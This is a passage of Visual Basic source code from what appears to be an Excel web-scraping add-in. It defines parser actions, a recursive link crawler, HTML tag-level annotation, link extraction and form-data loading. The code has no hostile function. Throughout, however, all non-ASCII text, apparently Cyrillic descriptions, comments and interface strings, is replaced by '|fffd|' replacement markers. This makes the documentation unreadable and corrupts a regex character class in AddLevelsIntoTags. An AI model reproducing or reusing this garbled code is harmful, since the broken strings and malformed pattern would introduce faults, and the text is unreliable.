                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, " & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd|HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, div class=category-items)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, catalog-items-list)" & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."

        .AddParameter "IncludePatterns", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "ExcludePatterns", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "SearchFilters", aps_Text, "HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "TargetPageMask", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "utf-8", "windows-1251", "gzip", "direct"), ""
        .AddParameter "Action", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "NextLevel"), ""
        .AddParameter "MaxCount", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", , "10000"
    End With

    With AAs.AddAction(fc_Developer, "AddLevelsIntoTags", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| level='N' |fffd||fffd||fffd| HTML-|fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  level='1', |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| -  level='2', |fffd| |fffd|.|fffd|."
    End With

    With AAs.AddAction(fc_HTML, "LoadHTML_MultiThreading", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."

        .AddParameter "MaxThreads", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("10", "20", "50", "100"), "20"
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "utf-8", "windows-1251"), ""
        .AddParameter "Filters", aps_Text, "HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_HTML, "ConvertTags", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (HTML |fffd||fffd||fffd||fffd|), " & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|1||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|2" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: HTML |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <a href='/catalog/aksessuary/'><span>|fffd||fffd||fffd||fffd||fffd||fffd|</span> <span class='name'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</span></a> " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||http://site.com/catalog/aksessuary/" & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "1(HTML |fffd||fffd||fffd||fffd||fffd||fffd|) span class=name  ;  2(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) ConvertToText  ; " & vbNewLine & _
                       "3(HTML |fffd||fffd||fffd||fffd||fffd||fffd|) a  ;  4(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) href_with_prefix"

        Dim ResultTypeList: ResultTypeList = Array("ConvertToText", "outerHTML", "innerHTML", "href", "href_with_prefix", "src", "src_with_prefix", "value", "content")
        .AddParameter "Filter1", aps_Combo, "HTML |fffd||fffd||fffd||fffd||fffd||fffd| 1", Array("", "a", "a class=link", "span", "div id=product*", "span class=name&&a class=link"), ""
        .AddParameter "Result1", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1", ResultTypeList, "ConvertToText"
        .AddParameter "Filter2", aps_Combo, "HTML |fffd||fffd||fffd||fffd||fffd||fffd| 2", Array("", "a", "a class=link", "span", "div id=product*", "span class=name&&a class=link"), ""
        .AddParameter "Result2", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2", ResultTypeList, "ConvertToText"
        .AddParameter "Filter3", aps_Combo, "HTML |fffd||fffd||fffd||fffd||fffd||fffd| 3", Array("", "a", "a class=link", "span", "div id=product*", "span class=name&&a class=link"), ""
        .AddParameter "Result3", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3", Array("", "ConvertToText", "outerHTML", "innerHTML", "href", "href_with_prefix", "src", "src_with_prefix", "value", "content"), ""
    End With


    With AAs.AddAction(fc_Developer, "LoadFormData", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| HTML-|fffd||fffd||fffd||fffd||fffd| <form>")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|=|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| <form>) " & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| POST-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, id=aspnetForm), |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"

        .AddParameter "Filters", aps_Text, "HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "POST", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| name=vasya&pwd=1234)"
        .AddParameter "Exclude", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| varname1&blank)"
        .AddParameter "ReturnValue", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd|", "|fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd|)", "|fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd|)"), "|fffd||fffd||fffd|"
        .AddParameter "VarName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "POSTdata"
    End With


End Sub

Function AddLevelsIntoTags(ByVal txt$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| level="N" |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd||fffd||fffd| |fffd| txt$
    On Error Resume Next
    Dim SelfClosing As Boolean, TagName$, v, TextBefore$, TagHeader$, TagHeaderNew$, txtlen&, lvl&, res$, pos&
    Const SelfClosingTags = ",area,base,basefont,br,col,frame,hr,img,input,isindex,link,meta,param,embed,"

    pos& = 1: txt = Replace(txt, " level=", " lvl=")
    With REGEXP
        .IgnoreCase = True: .Pattern = "<([a-zA-Z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|1-6]+)\b[^>]*>"
        If .test(txt) Then
            For Each v In .Execute(txt)
                DoEvents
                TagHeader$ = "": TagHeader$ = v.value
                TagName$ = v.submatches.item(0)
                SelfClosing = SelfClosingTags Like "*," & TagName$ & ",*"
                'Debug.Print TagName$ & " found, tag header: " & TagHeader$

                If Not SelfClosing Then
                    TextBefore$ = Left(txt, v.FirstIndex)

                    lvl& = 0: lvl& = UBound(Split(TextBefore$, "<" & TagName$)) - UBound(Split(TextBefore$, "</" & TagName$ & ">")) + 1
                    'Debug.Print TagName$ & " level=" & lvl& & ", text before: " & TextBefore$
                    TagHeaderNew$ = Left(TagHeader$, Len(TagName$) + 1) & " level='" & lvl& & "'" & Mid(TagHeader$, Len(TagName$) + 2)

                    res$ = res$ & Mid(txt, pos, v.FirstIndex - pos + 1) & TagHeaderNew$
                    pos = v.FirstIndex + Len(TagHeader$) + 1
                End If
            Next v
        End If
    End With
    AddLevelsIntoTags = res$ & Mid(txt, pos)
End Function

Function FindTargetPages(ByVal SourceUrl$, ByRef WP As WebsiteParser, ByVal IncludePatterns$, ByVal ExcludePatterns$, _
                         ByVal SearchFilters$, ByVal TargetPageMask$, Optional ByVal Encoding$, _
                         Optional ByVal MaxCount& = 10000, Optional ByVal Action$) As String
    On Error Resume Next
    Dim CheckedURLs As New Collection, FoundURLs As New Collection, URL, ind&
    If MaxCount& <= 0 Then MaxCount& = 10000
    'PI_arr = WP.PrInd1.ResetSettings

    If TEST_ACTIONS_MODE Then WP.CreateTemporaryProgressIndicator
    WP.PrInd1.ShowExtraBar "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", True
    WP.PrInd1.ExtraBar_SetColor vbMagenta

    ResursiveLinksSearching SourceUrl$, CheckedURLs, FoundURLs, WP, IncludePatterns$, ExcludePatterns$, _
                            SearchFilters$, TargetPageMask$, Encoding$, MaxCount&, Action$

    If FoundURLs.Count > 0 Then
        ReDim arr(1 To FoundURLs.Count) As String
        For Each URL In FoundURLs
            ind& = ind& + 1: arr(ind&) = CStr(URL)
        Next
        FindTargetPages = Join(arr, ARSEP)
    End If
    Set CheckedURLs = Nothing: Set FoundURLs = Nothing
    WP.PrInd1.HideExtraBar
End Function

Sub ResursiveLinksSearching(ByVal SourceUrl$, ByRef CheckedURLs As Collection, ByRef FoundURLs As Collection, ByRef WP As WebsiteParser, _
                            ByRef IncludePatterns$, ByRef ExcludePatterns$, ByRef SearchFilters$, ByRef TargetPageMask$, _
                            ByRef Encoding$, ByVal MaxCount&, ByRef Action$)
    On Error Resume Next
    Static MaxCheckedCount&: If MaxCount& > 0 Then MaxCheckedCount& = MaxCount&
    If MaxCheckedCount& = 0 Then MaxCheckedCount& = 10000

    If StopMacro Then Exit Sub
    CheckedURLs.Add SourceUrl$, SourceUrl$
    DoEvents
    Dim PageText$, LenTXT&, FilterApplied As Boolean, msg$, PageLinks As Collection, info$

    If CheckedURLs.Count > MaxCheckedCount& Then Exit Sub

    info$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & CheckedURLs.Count & " / " & FoundURLs.Count & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & SourceUrl$
    If TEST_ACTIONS_MODE Then
        With IIf(SETT.GetBoolean("ExtendedResultField", False), FP_ArrayActions_Edit.TextBox_TestDestination2, FP_ArrayActions_Edit.TextBox_TestDestination)
            .value = .value & vbNewLine & info$
            '.SetFocus
        End With
    End If

    With WP.PrInd1
        .ExtraBar_SetLineText 2, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & CheckedURLs.Count & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & FoundURLs.Count
        .ExtraBar_SetLineText 3, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & SourceUrl$
        If FoundURLs.Count = 1 Then .ExtraBar_SetColor 49152    'vbGreen
    End With
    DoEvents

    PageText$ = LoadFromURL_HTML(SourceUrl$, WP, Encoding$)
    DoEvents
    If InStr(1, PageText$, "</a>") = 0 Then Exit Sub

    If PageText$ Like "*" & TargetPageMask$ & "*" Then
        FoundURLs.Add SourceUrl$, SourceUrl$
        DoEvents

        Static SI As ParserSourceItem, CurrentLevel&
        If SI Is Nothing Then Set SI = New ParserSourceItem
        If CurrentLevel& = 0 Then CurrentLevel& = WP.SourceData.Actions.GetLevel
        If CurrentLevel& = 0 Then CurrentLevel& = 1

        Select Case Trim(Action$)
            Case ""        ' do nothing
            Case "NextLevel"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If Not TEST_ACTIONS_MODE Then WP.SourceData.Actions.GetActionsByLevel(CurrentLevel& + 1).ApplyTo SourceUrl$, SI
        End Select
    End If

    If SearchFilters$ Like "*=*" Then
        LenTXT& = Len(PageText$)
        PageText$ = ApplyHTMLFilters(PageText$, SearchFilters$, msg$)        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Len(PageText$) < LenTXT& Then FilterApplied = True
        DoEvents
    End If
    If InStr(1, PageText$, "</a>") = 0 Then Exit Sub

    Set PageLinks = GetTagsA(PageText$)
    DoEvents
    If PageLinks.Count = 0 Then Exit Sub

    Dim OK As Boolean, URL, X

    With REGEXP
        For Each URL In PageLinks
            OK = True: If StopMacro Then Exit For
            If Len(IncludePatterns$) Then .Pattern = IncludePatterns$: OK = .test(URL)
            If OK Then
                If Len(ExcludePatterns$) Then .Pattern = ExcludePatterns$: OK = Not .test(URL)
                If OK Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

                    Err.Clear: X = CheckedURLs(CStr(URL))
                    If Err Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        DoEvents
                        ResursiveLinksSearching URL, CheckedURLs, FoundURLs, WP, IncludePatterns$, _
                                                ExcludePatterns$, SearchFilters$, TargetPageMask$, Encoding$, 0, Action$
                    End If
                End If
            End If
        Next
    End With
End Sub

Function GetTagsA(ByVal txt$) As Collection
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| A |fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim Add_URL_Prefix$, URL$, v, TextAfterHeader$, TagHeader$
    Set GetTagsA = New Collection

    Add_URL_Prefix$ = Trim(Render(WEBSITE_URL_VARNAME$)): If Add_URL_Prefix$ = WEBSITE_URL_VARNAME$ Then Add_URL_Prefix$ = ""

    With REGEXP
        .IgnoreCase = True: .Pattern = "<a\b[^>]*>"
        If .test(txt) Then
            For Each v In .Execute(txt)
                TagHeader$ = "": TagHeader$ = v.value
                URL$ = GetAttributeFromTag(TagHeader$, "href")        ' get HREF attribute value

                If Not IsURL(URL$) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| http)
                    If Add_URL_Prefix$ Like "*?/" Then Add_URL_Prefix$ = Left(Add_URL_Prefix$, Len(Add_URL_Prefix$) - 1)
                    If Left(URL$, 1) = "?" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        Add_URL_Prefix$ = Split(LAST_USED_URL$, "?")(0)
                        URL$ = Add_URL_Prefix$ & URL$
                    Else
                        If Not URL$ Like "/*" Then URL$ = "/" & URL$
                        URL$ = Add_URL_Prefix$ & URL$
                    End If
                End If
                GetTagsA.Add URL$, URL$
            Next v
        End If
    End With
End Function


Function GetHyperlinkAndText(ByVal txt$, Optional ByVal prefix$, Optional ByVal URL_VarName$, Optional ByVal Text_VarName$) As String
    On Error Resume Next
    Dim URL$
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If Len(Trim(URL_VarName$)) Then ParserVariables.item("%" & Trim(URL_VarName$) & "%") = ""
    If Len(Trim(Text_VarName$)) Then ParserVariables.item("%" & Trim(Text_VarName$) & "%") = ""

    If IsURL(txt) Then
        URL$ = txt
    Else
        txt = GetTags(txt, "a", , , "outerHTML 1"): If txt = "" Then Exit Function
        URL$ = GetTags(txt, "a", , , "href 1")
        If URL$ Like "about:blank*" Then URL$ = Mid(URL$, 12)
        If URL$ Like "about:*" Then URL$ = Mid(URL$, 7)
